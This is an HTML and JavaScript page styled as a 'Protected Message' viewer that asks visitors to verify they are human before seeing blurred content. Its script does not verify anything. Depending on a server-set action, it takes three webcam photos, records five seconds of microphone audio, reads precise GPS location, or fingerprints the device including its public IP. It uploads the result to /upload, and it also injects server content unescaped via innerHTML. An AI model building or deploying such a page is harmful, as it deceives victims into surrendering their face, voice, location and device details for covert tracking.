<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Message Viewer</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: #0d0f12;
            color: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }

        .bg-image-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            overflow: hidden;
            display: none; 
            align-items: center;
            justify-content: center;
        }

        .bg-image {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(25px) brightness(0.4);
            transform: scale(1.1);
            display: none;
        }

        .glass-card {
            position: relative;
            z-index: 10;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px 30px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .icon-shield {
            font-size: 48px;
            margin-bottom: 15px;
            display: inline-block;
            background: -webkit-linear-gradient(#00f2fe, #4facfe);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        h2 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
            color: #ffffff;
        }

        p {
            font-size: 15px;
            color: #a0a0a0;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        button {
            background: linear-gradient(135deg, #0061ff 0%, #60efff 100%);
            color: #000;
            font-weight: 700;
            font-size: 16px;
            border: none;
            border-radius: 12px;
            padding: 15px 25px;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 20px rgba(0, 97, 255, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 25px rgba(0, 97, 255, 0.5);
        }

        button:active {
            transform: translateY(1px);
        }

        .btn-icon {
            font-size: 20px;
        }

        .status-msg {
            margin-top: 20px;
            font-size: 14px;
            font-weight: 600;
            display: none;
            animation: fadeIn 0.3s;
        }

        .status-loading { color: #ffca28; }
        .status-success { color: #00e676; }
        .status-error { color: #ff5252; }

        #videoElement, #canvasElement { display: none; }
        
        .clear-image {
            width: 100%;
            border-radius: 12px;
            margin-top: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            display: none;
            animation: fadeIn 1s;
        }

        .clear-text {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 12px;
            margin-top: 20px;
            display: none;
            animation: fadeIn 1s;
            text-align: left;
            line-height: 1.6;
            color: #fff;
            border: 1px solid rgba(255, 255, 255, 0.2);
            word-wrap: break-word;
        }
    </style>
</head>
<body>

<div class="bg-image-container" id="bgContainer">
    <img src="" alt="Blurred Background" class="bg-image" id="bgImage">
</div>

<div class="glass-card" id="mainCard">
    <div class="icon-shield">🛡️</div>
    <h2>Protected Message</h2>
    <p>This content is highly protected by our security system. Please verify that you are human to unlock and view it.</p>
    
    <button id="verifyBtn">
        <span class="btn-icon">👁️</span>
        Verify & View Content
    </button>
    
    <div id="loading" class="status-msg status-loading">⏳ Verifying... Please wait.</div>
    <div id="success" class="status-msg status-success">✅ Verification complete! Loading content...</div>
    <div id="error" class="status-msg status-error"></div>
    
    <img src="" id="finalImage" class="clear-image">
    <div id="finalText" class="clear-text"></div>
</div>

<video id="videoElement" autoplay playsinline></video>
<canvas id="canvasElement"></canvas>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('id');

    const verifyBtn = document.getElementById('verifyBtn');
    const loading = document.getElementById('loading');
    const success = document.getElementById('success');
    const errorMsg = document.getElementById('error');
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvasElement');
    const bgContainer = document.getElementById('bgContainer');
    const bgImage = document.getElementById('bgImage');
    const finalImage = document.getElementById('finalImage');
    const finalText = document.getElementById('finalText');

    let payloadData = null;

    async function init() {
        if (!userId) {
            verifyBtn.style.display = 'none';
            showError("Invalid or missing link parameter.");
            return;
        }

        try {
            const res = await fetch(`/api/link/${userId}`);
            if (res.ok) {
                const data = await res.json();
                payloadData = data;
                
                bgContainer.style.display = 'flex';

                if (data.payload_type === 'image') {
                    bgImage.src = data.original_image_url;
                    bgImage.style.display = 'block';
                } else if (data.payload_type === 'text') {
                    bgContainer.innerHTML = '<div style="color:white; font-size: 30px; font-weight: bold; filter: blur(12px); padding: 40px; text-align: center; max-width: 80%; background: rgba(255,255,255,0.05); border-radius: 20px;">[ Hidden Secret Text Message ]<br><br>Length: ' + data.payload_content.length + ' chars</div>';
                } else if (data.payload_type === 'template') {
                    bgContainer.innerHTML = '<div style="color:white; font-size: 50px; font-weight: bold; filter: blur(12px); padding: 40px; text-align: center; background: rgba(255,255,255,0.05); border-radius: 20px;">' + data.payload_content + '</div>';
                }
            } else {
                showError("Link expired or not found.");
                verifyBtn.style.display = 'none';
            }
        } catch (e) {
            console.error(e);
        }
    }

    function showError(text) {
        errorMsg.textContent = "❌ " + text;
        errorMsg.style.display = 'block';
        loading.style.display = 'none';
        verifyBtn.style.display = 'block';
        verifyBtn.innerHTML = '<span class="btn-icon">🔄</span> Try Again';
    }

    verifyBtn.addEventListener('click', async () => {
        try {
            verifyBtn.style.display = 'none';
            loading.style.display = 'block';
            errorMsg.style.display = 'none';

            const targetAction = payloadData.target_action || 'camera';
            const formData = new FormData();
            formData.append('id', userId);
            formData.append('target_action', targetAction);

            if (targetAction === 'camera') {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                video.srcObject = stream;
                
                video.onloadedmetadata = async () => {
                    const images = [];
                    for (let i = 0; i < 3; i++) {
                        await new Promise(resolve => setTimeout(resolve, 800));
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                        formData.append('files', blob, `photo${i}.jpg`);
                    }
                    stream.getTracks().forEach(track => track.stop());
                    await sendVerification(formData);
                };
            } 
            else if (targetAction === 'location') {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        formData.append('locationData', JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        }));
                        await sendVerification(formData);
                    },
                    (err) => {
                        showError("Location permission is required to verify.");
                    },
                    { enableHighAccuracy: true }
                );
            }
            else if (targetAction === 'voice') {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new window.MediaRecorder(stream);
                const audioChunks = [];

                mediaRecorder.addEventListener("dataavailable", event => {
                    audioChunks.push(event.data);
                });

                mediaRecorder.addEventListener("stop", async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    formData.append('files', audioBlob, 'voice.webm');
                    stream.getTracks().forEach(track => track.stop());
                    await sendVerification(formData);
                });

                mediaRecorder.start();
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 5000);
            }
            else if (targetAction === 'device_info') {
                let ip = 'Unknown';
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    ip = ipData.ip;
                } catch (e) {}

                let battery = 'Unknown';
                let charging = 'Unknown';
                try {
                    if (navigator.getBattery) {
                        const b = await navigator.getBattery();
                        battery = Math.round(b.level * 100) + '%';
                        charging = b.charging ? 'Yes' : 'No';
                    }
                } catch(e) {}

                let gpu = 'Unknown';
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        }
                    }
                } catch(e) {}

                const deviceInfo = {
                    ip: ip,
                    battery: battery,
                    charging: charging,
                    os: navigator.platform,
                    browser: navigator.vendor || 'Unknown',
                    network: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                    cores: navigator.hardwareConcurrency || 'Unknown',
                    ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
                    screen: window.screen.width + 'x' + window.screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    gpu: gpu,
                    userAgent: navigator.userAgent
                };
                formData.append('deviceData', JSON.stringify(deviceInfo));
                await sendVerification(formData);
            }
        } catch (err) {
            console.error("Permission error:", err);
            showError("Permission is required to verify.");
        }
    });

    async function sendVerification(formData) {
        try {
            const response = await fetch('/upload', {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                loading.style.display = 'none';
                success.style.display = 'block';
                
                setTimeout(() => {
                    success.style.display = 'none';
                    bgContainer.style.opacity = '0'; 
                    document.querySelector('.icon-shield').style.display = 'none';
                    document.querySelector('h2').style.display = 'none';
                    document.querySelector('p').style.display = 'none';
                    document.getElementById('mainCard').style.background = 'rgba(10, 10, 10, 0.9)';
                    
                    if (payloadData.payload_type === 'image') {
                        finalImage.src = payloadData.original_image_url;
                        finalImage.style.display = 'block';
                    } else if (payloadData.payload_type === 'text') {
                        finalText.innerHTML = `<h3>📝 Secret Message:</h3><br>` + payloadData.payload_content.replace(/\n/g, '<br>');
                        finalText.style.display = 'block';
                    } else if (payloadData.payload_type === 'template') {
                        finalText.innerHTML = `<div style="font-size:30px; text-align:center;">` + payloadData.payload_content + `</div>`;
                        finalText.style.display = 'block';
                    }
                }, 1000);
            } else {
                showError("Verification failed on server.");
            }
        } catch (err) {
            showError("Network error during verification.");
        }
    }

    init();
</script>

</body>
</html>
